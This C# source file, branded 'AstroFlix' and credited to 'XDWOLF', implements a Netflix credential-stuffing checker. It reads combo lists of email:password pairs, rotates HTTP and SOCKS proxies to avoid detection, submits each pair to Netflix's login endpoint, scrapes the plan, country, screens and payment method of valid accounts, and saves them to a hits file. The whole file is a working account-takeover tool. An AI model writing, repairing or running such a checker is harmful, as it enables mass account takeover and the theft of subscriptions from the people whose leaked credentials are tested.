using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Netflix
{
    internal class CheckerHelper
    {
        public static int total;

        public static int bad = 0;

        public static int hits = 0;

        public static int premium = 0;

        public static int free = 0;

        public static int uhd = 0;

        public static int hd = 0;

        public static int err = 0;

        public static int check = 0;

        public static int accindex = 0;

        public static List<string> proxies = new List<string>();

        public static string proxytype = "";

        public static int proxyindex = 0;

        public static int proxytotal = 0;

        public static int stop = 0;

        public static List<string> accounts = new List<string>();

        public static int CPM = 0;

        public static int CPM_aux = 0;

        public static int threads;

        public static void LoadCombos(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper.total++;
                        }
                    }
                }
            }
        }

        public static void LoadProxies(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper.proxytotal++;
                        }
                    }
                }
            }
        }

        public static void UpdateTitle()
        {
            for (; ; )
            {
                CheckerHelper.CPM = CheckerHelper.CPM_aux;
                CheckerHelper.CPM_aux = 0;
                Colorful.Console.Title = string.Format("AstroFlix | Coded by XDWOLF | Module: Netflix | Checked {0} - Remaining {1} | Hits {2} - Free {3} - Fails {4} - CPM ", new object[]
                {
                        CheckerHelper.check,
                        CheckerHelper.total,
                        CheckerHelper.hits,
                        CheckerHelper.free,
                        CheckerHelper.bad,
                        CheckerHelper.err,
                }) + CheckerHelper.CPM * 60;
                Thread.Sleep(1000);
            }
        }

        public static void Check()
        {
            for (; ; )
            {
                if (CheckerHelper.proxyindex > CheckerHelper.proxies.Count<string>() - 2)
                {
                    CheckerHelper.proxyindex = 0;
                }
                try
                {
                    Interlocked.Increment(ref CheckerHelper.proxyindex);
                    using (HttpRequest req = new HttpRequest())
                    {
                        if (CheckerHelper.accindex >= CheckerHelper.accounts.Count<string>())
                        {
                            CheckerHelper.stop++;
                            break;
                        }
                        Interlocked.Increment(ref CheckerHelper.accindex);
                        string[] array = CheckerHelper.accounts[CheckerHelper.accindex].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        });
                        string text = array[0] + ":" + array[1];
                        try
                        {
                            if (CheckerHelper.proxytype == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper.proxytype == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper.proxytype == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper.proxytype == "NO")
                            {
                                req.Proxy = null;
                            }
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36";
                            req.KeepAlive = true;
                            req.IgnoreProtocolErrors = true;
                            req.ConnectTimeout = 5000;
                            req.Cookies = null;
                            req.UseCookies = true;
                            req.Referer = "https://www.us-east-1.prodaa.netflix.com/de-en/Login?nextpage=https%3A%2F%2Fwww.us-east-1.prodaa.netflix.com%2FYouraccount";
                            string str1 = req.Get("https://www.us-east-1.prodaa.netflix.com/login", null).ToString();
                            string auth = CheckerHelper.Parse(str1, "name=\"authURL\" value=\"", "\"");
                            string post = "userLoginId=" + array[0] + "&password=" + array[1] + "&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode&authURL=" + auth + "&nextPage=https%3A%2F%2Fwww.us-east-1.prodaa.netflix.com%2FYourAccount&showPassword=&countryCode=";
                            string str2 = req.Post("https://www.us-east-1.prodaa.netflix.com/login", post, "application/x-www-form-urlencoded").ToString();
                            string plan = Regex.Match(str2, "},\"currentPlanName\":\"(.*)\",\"nextPlan\":null,\"").Groups[1].ToString();
                            string screens = Regex.Match(str2, ",\"maxStreams\":(.*),\"isDiscCapable\":").Groups[1].ToString();
                            string pmethod = Regex.Match(str2, "data-uia=\"payment-text\">(.*)</span> </span><span id=\"\" ").Groups[1].ToString();
                            string country = Regex.Match(str2, "\",\"locale\":\"(.*)\",\"sessionLength\"").Groups[1].ToString();
                            if (str2.Contains("\"membershipStatus\":\"CURRENT_MEMBER\""))
                            {
                                CheckerHelper.CPM_aux++;
                                CheckerHelper.check++;
                                CheckerHelper.hits++;
                                Colorful.Console.WriteLine("[+] " + text, Color.Green);
                                Colorful.Console.WriteLine("- Plan: " + plan, Color.Green);
                                Colorful.Console.WriteLine("- Country: " + country, Color.Green);
                                Colorful.Console.WriteLine("- Screens: " + screens, Color.Green);
                                Colorful.Console.WriteLine("- Payment Method: " + pmethod, Color.Green);
                                CheckerHelper.Good("Account: " + text);
                                CheckerHelper.Good("Email: " + array[0]);
                                CheckerHelper.Good("Password: " + array[1]);
                                CheckerHelper.Good("Plan: " + plan);
                                CheckerHelper.Good("Country: " + country);
                                CheckerHelper.Good("Screens: " + screens);
                                CheckerHelper.Good("Payment Method: " + pmethod);
                                CheckerHelper.Good("═══════════ | NETFLIX | ═══════════");
                            }
                            if (str2.Contains("\"membershipStatus\":\"NEVER_MEMBER\""))
                            {
                                CheckerHelper.CPM_aux++;
                                CheckerHelper.check++;
                                CheckerHelper.free++;
                                Colorful.Console.WriteLine(text, Color.LightGoldenrodYellow);
                                CheckerHelper.Free(text);
                            }
                            else if (str2.Contains("\"membershipStatus\":\"ANONYMOUS\""))
                            {
                                CheckerHelper.CPM_aux++;
                                CheckerHelper.check++;
                                CheckerHelper.bad++;
                                CheckerHelper.Bad(text);
                            }
                            else
                            {
                                CheckerHelper.accounts.Add(text);
                            }
                        }
                        catch (Exception)
                        {
                            CheckerHelper.accounts.Add(text);
                        }
                    }
                    continue;
                }
                catch
                {
                    Interlocked.Increment(ref CheckerHelper.err);
                }
            }
        }

        public static void Good(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/Good.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {

            }
        }
        public static void Bad(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/Bad.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {

            }
        }
        public static void Free(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/Free.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {

            }
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}
